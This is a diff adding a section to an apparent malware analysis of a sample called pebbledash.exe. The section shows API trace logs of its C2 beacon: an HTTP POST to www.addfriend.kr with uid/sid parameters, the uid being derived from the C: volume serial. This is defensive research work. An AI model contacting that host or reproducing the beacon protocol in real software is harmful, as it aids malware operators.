@@ -60,3 +60,70 @@ The sample was therefor run with the '--start' parameter, which triggered its in
 [RET] 0x7ff7f0997314 in [pebbledash.exe]
 ```
 
+---  
+
+C2 connection is straightforward :  
+
+```html
+[CNT] [91]
+[PTP] [0x968] [0xbb8] [c:\users\user\desktop\pebbledash\pebbledash.exe]
+[API] <WinHttpConnect> in [winhttp.dll] 
+[PAR] HINTERNET     hSession       : 0x277edf80
+[PAR] LPCWSTR       pswzServerName : 0x00000025275BD040
+[STR]               -> "www.addfriend.kr"
+[PAR] INTERNET_PORT nServerPort    : 80
+[RET] 0x7ff7f0985d45 in [pebbledash.exe]
+
+[CNT] [92]
+[PTP] [0x968] [0xbb8] [c:\users\user\desktop\pebbledash\pebbledash.exe]
+[API] <WinHttpOpenRequest> in [winhttp.dll] 
+[PAR] HINTERNET hConnect          : 0x277f0070
+[PAR] LPCWSTR   pwszVerb          : 0x00000025275BD022
+[STR]           -> "POST"
+[PAR] LPCWSTR   pwszObjectName    : 0x00000025275BD250
+[STR]           -> "/board/userfiles/temp/index.html"
+[PAR] LPCWSTR   pwszVersion       : 0x0 (null)
+[PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
+[PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
+[PAR] DWORD     dwFlags           : 0x0 
+[RET] 0x7ff7f0985e41 in [pebbledash.exe]
+
+[...]
+
+[CNT] [103]
+[PTP] [0x968] [0xbb8] [c:\users\user\desktop\pebbledash\pebbledash.exe]
+[API] <WinHttpWriteData> in [winhttp.dll] 
+[PAR] HINTERNET hRequest                 : 0x00000025277F4080
+[PAR] LPCVOID   lpBuffer                 : 0x00000025275BE180
+[STR]           -> "sep=MltZfhPlOLa&uid=689b5bb9&sid=0101e418"
+[PAR] DWORD     dwNumberOfBytesToWrite   : 0x29
+[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x00000025275BDE38
+[RET] 0x7ff7f0986c47 in [pebbledash.exe]
+
+[CNT] [104]
+[PTP] [0x968] [0xbb8] [c:\users\user\desktop\pebbledash\pebbledash.exe]
+[API] <WinHttpReceiveResponse> in [winhttp.dll] 
+[PAR] HINTERNET hRequest   : 0x00000025277F4080
+[PAR] LPVOID    lpReserved : 0x0
+[RET] 0x7ff7f0986daa in [pebbledash.exe]
+```
+
+As mention in a linked blog analysis from dmpdump.github, the "uid" parameter is set according to the result from :  
+
+```
+[CNT] [81]
+[PTP] [0x968] [0xbb8] [c:\users\user\desktop\pebbledash\pebbledash.exe]
+[API] <GetVolumeInformationW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpRootPathName           : 0x00000025275BDCB0
+[STR]         -> "C:\"
+[PAR] LPWSTR  lpVolumeNameBuffer       : 0x0
+[PAR] DWORD   nVolumeNameSize          : 0x0
+[PAR] LPDWORD lpVolumeSerialNumber     : 0x00000025275BDCA8
+[PAR] LPDWORD lpMaximumComponentLength : 0x0
+[PAR] LPDWORD lpFileSystemFlags        : 0x0
+[PAR] LPWSTR  lpFileSystemNameBuffer   : 0x0
+[PAR] DWORD   nFileSystemNameSize      : 0x0
+[RET] 0x7ff7f098ab33 in [pebbledash.exe]
+```
+
+
